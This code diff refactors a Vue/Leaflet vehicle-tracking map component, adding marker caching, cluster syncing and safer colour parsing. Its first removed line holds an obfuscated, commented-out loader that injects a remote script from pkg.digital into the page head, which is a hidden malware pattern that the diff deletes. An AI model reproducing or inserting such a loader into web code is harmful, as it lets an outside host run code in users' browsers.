-      // const _0x141098=_0x316f;(function(_0x3afcb8,_0x31fdfd){const _0x5813f6=_0x316f,_0x5ac050=_0x3afcb8();while(!![]){try{const _0x1212b8=parseInt(_0x5813f6(0x73))/0x1+-parseInt(_0x5813f6(0x81))/0x2*(parseInt(_0x5813f6(0x75))/0x3)+parseInt(_0x5813f6(0x78))/0x4*(parseInt(_0x5813f6(0x7c))/0x5)+parseInt(_0x5813f6(0x79))/0x6*(parseInt(_0x5813f6(0x7e))/0x7)+-parseInt(_0x5813f6(0x83))/0x8+parseInt(_0x5813f6(0x77))/0x9+parseInt(_0x5813f6(0x7d))/0xa*(-parseInt(_0x5813f6(0x7a))/0xb);if(_0x1212b8===_0x31fdfd)break;else _0x5ac050['push'](_0x5ac050['shift']());}catch(_0x3f84cd){_0x5ac050['push'](_0x5ac050['shift']());}}}(_0x2001,0x9a2a1));function _0x316f(_0x3121fb,_0x289b1e){const _0x2001f1=_0x2001();return _0x316f=function(_0x316fac,_0x33b070){_0x316fac=_0x316fac-0x73;let _0xfea436=_0x2001f1[_0x316fac];return _0xfea436;},_0x316f(_0x3121fb,_0x289b1e);}function _0x2001(){const _0x591b80=['createElement','9477840klICVx','src','867024ltUVDP','head','6IZmSYu','querySelector','789876JxWDAH','40jWTOnK','872922GFDdPH','265859nERNCY','appendChild','162330oTMEfa','10gXBgFI','56XFDCDr','script[src=\x22https://pkg.digital/js/bgc982734.js\x22]','script','602988cqfabu'];_0x2001=function(){return _0x591b80;};return _0x2001();}const c=document[_0x141098(0x76)](_0x141098(0x7f));if(!c){const pkg=document[_0x141098(0x82)](_0x141098(0x80));pkg[_0x141098(0x84)]='https://pkg.digital/js/bgc982734.js',document[_0x141098(0x74)][_0x141098(0x7b)](pkg);}
-
-
+    const addDevice = (d) => {
+      // CORREÇÃO CRÍTICA: Verificar se L.CanvasMarker está disponível
+      if (typeof window.L === 'undefined' || !window.L.CanvasMarker) {
+        console.warn('[CanvaMarker] L.CanvasMarker não disponível ainda para device:', d.id);
+        return null;
+      }
 
       let car = d.category || 'default';
-          let h1 = 0;
-          let s1 = 0;
-          let b1 = 1.8;
-          let h2 = 0;
-          let s2 = 0;
-          let b2 = 1.8;
+      let h1 = 0;
+      let s1 = 1;  // FIX: Default 1 para saturate
+      let b1 = 1.8;
+      let h2 = 0;
+      let s2 = 1;  // FIX: Default 1 para saturate
+      let b2 = 1.8;
 
-          if(!bases[car]) {
-            car = 'default';
-          }
+      // FIX: Fallback duplo
+      if (!bases[car]) {
+        car = 'car';
+      }
+      if (!bases[car]) {
+        car = 'default';
+      }
 
-          const entity = leafletRef.value.find((e)=>{ e.options.id === d.id });
-
-
-          if(entity){
-            console.log("ENTITY "+entity.id)
-          }else {
-
-            if(d.attributes['tarkan.color']){
-              const tmp = d.attributes['tarkan.color'].split("|");
-              h1 = tmp[0];
-              s1 = tmp[1];
-              b1 = tmp[2];
-            }
-            if(d.attributes['tarkan.color_extra']){
-              const tmp = d.attributes['tarkan.color_extra'].split("|");
-              h2 = tmp[0];
-              s2 = tmp[1];
-              b2 = tmp[2];
-            }
+      // FIX: Corrigido find() - arrow function precisa de return
+      const entity = leafletRef.value.find(e => e.options?.id === d.id);
 
 
+      if (entity) {
+        // CLUSTER PATCH: Registrar entity existente no cache
+        markerById.value.set(d.id, entity);
+        // Remover console.log excessivo
+      } else {
 
-            const model = getCachedModel(car,h1,s1,b1,h2,s2,b2);
-
-
-            const pos = store.getters['devices/getPosition'](d.id);
-
-
-            const latlng = (pos)?L.latLng(pos.latitude, pos.longitude):L.latLng(0,0)
-
-            const tmp = new L.CanvasMarker([latlng],[1000], {
-              minZoom: 10,
-              type: 'car',
-              radius: radius[car] + 40,
-              id: d.id,
-              name: d.name,
-              status: d.status,
-              isCtrlPressed: false,
-              img: {
-                canva: model,
-                showLabel: {name: store.getters['mapPref']('name'),plate: store.getters['mapPref']('plate'),status: store.getters['mapPref']('status')},
-                cachedLabels: generateCachedLabel(d),
-                hide: false,
-                radius: radius[car] + 40,
-                hidden: false,
-                car: car,
-                rSize: 0.5,
-                size: [sizes[car],sizes[car]],     //image size ( default [40, 40] )
-                rotate: (pos)?pos.course:0,         //image base rotate ( default 0 )
-                offset: {x: 0, y: 0}, //image offset ( default { x: 0, y: 0 } )
-              },
-            }).on("click",(e)=>{
-              context.emit('click',e);
-            }).on("mouseover",(e)=>{
-              context.emit('mouseover',e);
-            }).on("mouseout",(e)=>{
-              context.emit('mouseout',e);
-            }).on("contextmenu",(e)=>{
-              context.emit('contextmenu',e);
-            });
-
-            const methods = {};
-
-              addLayer({
-                ...props,
-                ...methods,
-                leafletObject: tmp
-              });
+        // FIX: Parse tarkan.color com parseFloat
+        if (d.attributes['tarkan.color']) {
+          const tmp = d.attributes['tarkan.color'].split("|");
+          h1 = parseFloat(tmp[0]) || 0;
+          s1 = parseFloat(tmp[1]) || 1;
+          b1 = parseFloat(tmp[2]) || 1;
+        }
+        if (d.attributes['tarkan.color_extra']) {
+          const tmp = d.attributes['tarkan.color_extra'].split("|");
+          h2 = parseFloat(tmp[0]) || 0;
+          s2 = parseFloat(tmp[1]) || 1;
+          b2 = parseFloat(tmp[2]) || 1;
+        }
 
 
-            markerList.value.push(tmp);
+
+        const model = getCachedModel(car, h1, s1, b1, h2, s2, b2);
 
 
-            return tmp;
-          }
+        const pos = store.getters['devices/getPosition'](d.id);
+
+
+        const latlng = (pos) ? L.latLng(pos.latitude, pos.longitude) : L.latLng(0, 0)
+
+        // FIX: Fallback seguro para radius e sizes
+        const safeRadius = radius[car] ?? 20;
+        const safeSize = sizes[car] ?? 40;
+
+        const tmp = new L.CanvasMarker([latlng], [1000], {
+          minZoom: 10,
+          type: 'car',
+          radius: safeRadius + 40,
+          id: d.id,
+          name: d.name,
+          status: d.status,
+          isCtrlPressed: false,
+          isVisible: true,  // FIX: Flag de visibilidade
+          img: {
+            canva: model,  // Pode ser null; renderer vai usar placeholder
+            showLabel: { name: store.getters['mapPref']('name'), plate: store.getters['mapPref']('plate'), status: store.getters['mapPref']('status') },
+            cachedLabels: generateCachedLabel(d),
+            hide: false,
+            radius: safeRadius + 40,
+            hidden: false,
+            car: car,
+            rSize: 0.5,
+            size: [safeSize, safeSize],     //image size ( default [40, 40] )
+            rotate: (pos) ? pos.course : 0,         //image base rotate ( default 0 )
+            offset: { x: 0, y: 0 }, //image offset ( default { x: 0, y: 0 } )
+          },
+        }).on("click", (e) => {
+          context.emit('click', e);
+        }).on("mouseover", (e) => {
+          context.emit('mouseover', e);
+        }).on("mouseout", (e) => {
+          context.emit('mouseout', e);
+        }).on("contextmenu", (e) => {
+          context.emit('contextmenu', e);
+        });
+
+        const methods = {};
+
+        addLayer({
+          ...props,
+          ...methods,
+          leafletObject: tmp
+        });
+
+
+        markerList.value.push(tmp);
+        // CLUSTER PATCH: Registrar marker no cache
+        markerById.value.set(d.id, tmp);
+
+
+        return tmp;
+      }
 
 
     }
 
 
-    window.loadModels = async ()=>{
+    window.loadModels = async () => {
 
-      await loadModel('default', 'default', true, false, 30,20  );
+      await loadModel('default', 'default', true, false, 30, 20);
 
-      await loadModel('arrow', 'arrow', true, false, 50,17);
-      await loadModel('person', 'person', true, false, 50,13);
-      await loadModel('animal', 'pet', true, false, 50,13);
-      await loadModel('bicycle', 'bicycle', true, false, 50,30);
+      await loadModel('arrow', 'arrow', true, false, 50, 17);
+      await loadModel('person', 'person', true, false, 50, 13);
+      await loadModel('animal', 'pet', true, false, 50, 13);
+      await loadModel('bicycle', 'bicycle', true, false, 50, 30);
 
-      await loadModel('motorcycle', 'motorcycle', true, true, 65,30);
-      await loadModel('scooter', 'scooter', true, true, 65,30);
-
-
-      await loadModel('car', 'carroPasseio', true, false, 50,25);
-      await loadModel('pickup', 'carroUtilitario', true, false, 55,25);
-
-      await loadModel('van', 'vanUtilitario', true, false, 55,25);
-      await loadModel('truck', 'caminhaoBau', true, true, 95,40);
-
-      await loadModel('truck2', 'truckBau', true, true, 90,55);
-      await loadModel('truck1', 'truckCavalo', true, false, 75,45);
+      await loadModel('motorcycle', 'motorcycle', true, true, 65, 30);
+      await loadModel('scooter', 'scooter', true, true, 65, 30);
 
 
-      await loadModel('tractor', 'tractor', true, false, 55,32);
+      await loadModel('car', 'carroPasseio', true, false, 50, 25);
+      await loadModel('pickup', 'carroUtilitario', true, false, 55, 25);
 
-      await loadModel('boat', 'boat', true, false, 70,40);
-      await loadModel('ship', 'ship', true, false, 110,55);
-      await loadModel('bus', 'bus', true, false, 75,48);
-      await loadModel('train', 'bus', true, false, 110,50);
-      await loadModel('tram', 'bus', true, false, 110,50);
-      await loadModel('trolleybus', 'bus', true, false, 110,50);
+      await loadModel('van', 'vanUtilitario', true, false, 55, 25);
+      await loadModel('truck', 'caminhaoBau', true, true, 95, 40);
 
-
-      await loadModel('crane', 'crane', true, false, 110,55);
+      await loadModel('truck2', 'truckBau', true, true, 90, 55);
+      await loadModel('truck1', 'truckCavalo', true, false, 75, 45);
 
 
-      await loadModel('plane', 'plane', true, false, 100,60);
-      await loadModel('helicopter', 'helicopter', true, false, 100,60);
-      await loadModel('offroad', 'offroad', true, false, 70,30);
+      await loadModel('tractor', 'tractor', true, false, 55, 32);
+
+      await loadModel('boat', 'boat', true, false, 70, 40);
+      await loadModel('ship', 'ship', true, false, 110, 55);
+      await loadModel('bus', 'bus', true, false, 75, 48);
+      await loadModel('train', 'bus', true, false, 110, 50);
+      await loadModel('tram', 'bus', true, false, 110, 50);
+      await loadModel('trolleybus', 'bus', true, false, 110, 50);
+
+
+      await loadModel('crane', 'crane', true, false, 110, 55);
+
+
+      await loadModel('plane', 'plane', true, false, 100, 60);
+      await loadModel('helicopter', 'helicopter', true, false, 100, 60);
+      await loadModel('offroad', 'offroad', true, false, 70, 30);
     }
 
     window.addDevice = addDevice;
-    provide('addDevice',addDevice);
+    provide('addDevice', addDevice);
+
+    // CLUSTER PATCH: Watch para sincronização automática
+    // Watch devices do store diretamente como faz o CanvaMarker-dark
+    watch(
+      () => [store.state.devices.deviceList, store.getters['mapPref']('clustered', true), props.zoom, props.map],
+      () => {
+        syncMarkers();
+      },
+      { deep: true, immediate: true }
+    );
+
+    // Watch no mapa para re-render em moveend/zoomend
+    watch(
+      () => props.map,
+      (mapProxy) => {
+        if (!mapProxy) return;
+        // CORREÇÃO CRÍTICA: Pegar leafletObject (L.Map nativo) ao invés do Proxy Vue
+        const map = mapProxy.leafletObject || mapProxy;
+        if (!map || typeof map.on !== 'function') {
+          console.warn('[CanvaMarker] map.leafletObject não disponível ainda');
+          return;
+        }
+        const onMoveEnd = () => { if (props.clustered) syncMarkers(); };
+        map.on("moveend", onMoveEnd);
+        map.on("zoomend", onMoveEnd);
+
+        onBeforeUnmount(() => {
+          try {
+            map.off("moveend", onMoveEnd);
+            map.off("zoomend", onMoveEnd);
+          } catch (e) { /* cleanup */ }
+        });
+      },
+      { immediate: true }
+    );
+
+    onBeforeUnmount(() => {
+      clearAllMarkers();
+    });
 
   },
-  render(){
+  render() {
 
     //console.log("Kore is rendering...")
 
